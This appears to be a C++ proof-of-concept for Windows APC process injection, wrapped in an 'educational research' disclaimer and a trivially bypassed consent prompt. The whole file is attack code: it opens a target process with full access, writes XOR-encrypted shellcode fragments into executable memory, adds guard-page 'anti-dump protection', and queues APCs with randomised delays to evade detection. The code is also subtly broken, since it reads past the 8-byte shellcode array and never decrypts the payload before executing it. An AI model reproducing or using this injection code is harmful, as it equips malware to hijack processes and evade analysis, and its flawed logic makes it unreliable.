/*
EDUCATIONAL SECURITY RESEARCH TOOL
===================================
This code is designed for cybersecurity education and authorized research only.
Unauthorized use is prohibited and may violate applicable laws.

Purpose: Demonstrate APC injection techniques for security research
Usage: Only in authorized lab environments with proper permissions  
License: Educational use only - see LICENSE file

WARNING: This is a proof-of-concept for educational purposes.
Do not use on systems without explicit written authorization.
*/

#include <windows.h>
#include <tlhelp32.h>
#include <vector> 
#include <cstdlib>
#include <ctime>
#include <iostream>

#define PAGE_EXECUTE_ONLY 0x20
#define EDUCATIONAL_MARKER "EDU_RESEARCH_TOOL_v1.0"

bool CheckAuthorization() {
    char* auth_env = getenv("SECURITY_RESEARCH_AUTH");
    if (!auth_env || strcmp(auth_env, "1") != 0) {
        std::cout << "WARNING: This is educational security research software.\n";
        std::cout << "Use only in authorized environments with proper permissions.\n";
        std::cout << "Set SECURITY_RESEARCH_AUTH=1 to acknowledge authorized use.\n";
        
        char response[10];
        std::cout << "Continue for educational purposes only? (yes/no): ";
        std::cin >> response;
        
        return (strncmp(response, "yes", 3) == 0 || strncmp(response, "y", 1) == 0);
    }
    return true;
}

BYTE ShellcodeStub[] = {
    0x48, 0x31, 0xC0,
    0x48, 0x83, 0xC0, 0x3C,
    0xC3
};

void InstallAntiDumpProtection(HANDLE hProcess, const std::vector<LPVOID>& fragments);
PAPCFUNC CreatePayloadReconstructionStub(HANDLE hProcess, const std::vector<LPVOID>& fragments, const BYTE* key);

void InstallAntiDumpProtection(HANDLE hProcess, const std::vector<LPVOID>& fragments) {
    for (LPVOID fragment : fragments) {
        DWORD oldProtect;
        VirtualProtectEx(hProcess, fragment, 4096, PAGE_GUARD | PAGE_EXECUTE_READ, &oldProtect);
    }
}

PAPCFUNC CreatePayloadReconstructionStub(HANDLE hProcess, const std::vector<LPVOID>& fragments, const BYTE* key) {
    return (PAPCFUNC)(fragments.empty() ? NULL : fragments[0]);
}

bool HijackProcess(DWORD pid) {
    if (!CheckAuthorization()) {
        std::cout << "Authorization check failed. Exiting for safety.\n";
        return false;
    }
    
    std::cout << "[EDUCATIONAL] Demonstrating APC injection technique\n";
    std::cout << "[RESEARCH] Target PID: " << pid << std::endl;
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return false;
    }
    
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    
    std::vector<DWORD> target_threads;
    
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                target_threads.push_back(te32.th32ThreadID);
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    
    CloseHandle(hSnapshot);
    
    if (target_threads.empty()) {
        CloseHandle(hProcess);
        return false;
    }
    
    SIZE_T payload_size = 4096;
    LPVOID payload_mem = VirtualAllocEx(hProcess, NULL, payload_size, 
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!payload_mem) {
        CloseHandle(hProcess);
        return false;
    }
    
    BYTE encrypted_payload[4096];
    BYTE encryption_key[32];
    
    srand((unsigned int)time(NULL));
    for (int i = 0; i < 32; i++) {
        encryption_key[i] = rand() % 256;
    }
    
    std::vector<LPVOID> payload_fragments;
    SIZE_T fragment_size = payload_size / 8;
    
    for (int i = 0; i < 8; i++) {
        LPVOID fragment_mem = VirtualAllocEx(hProcess, NULL, fragment_size,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (fragment_mem) {
            payload_fragments.push_back(fragment_mem);
            
            for (SIZE_T j = 0; j < fragment_size; j++) {
                BYTE original_byte = ((BYTE*)&ShellcodeStub)[i * fragment_size + j];
                BYTE encrypted_byte = original_byte ^ encryption_key[j % 32];
                WriteProcessMemory(hProcess, (BYTE*)fragment_mem + j, 
                                 &encrypted_byte, 1, NULL);
            }
        }
    }
    
    InstallAntiDumpProtection(hProcess, payload_fragments);
    
    DWORD_PTR system_affinity, process_affinity;
    GetProcessAffinityMask(hProcess, &process_affinity, &system_affinity);
    
    bool apc_queued = false;
    for (size_t i = 0; i < target_threads.size() && i < 4; i++) {
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, target_threads[i]);
        if (hThread) {
            SetThreadAffinityMask(hThread, 1ULL << (i % 4));
            
            PAPCFUNC apc_routine = (PAPCFUNC)CreatePayloadReconstructionStub(
                hProcess, payload_fragments, encryption_key);
            
            if (apc_routine && QueueUserAPC(apc_routine, hThread, 0)) {
                apc_queued = true;
            }
            
            CloseHandle(hThread);
        }
        
        Sleep(100 + (rand() % 200));
    }
    
    CloseHandle(hProcess);
    return apc_queued;
}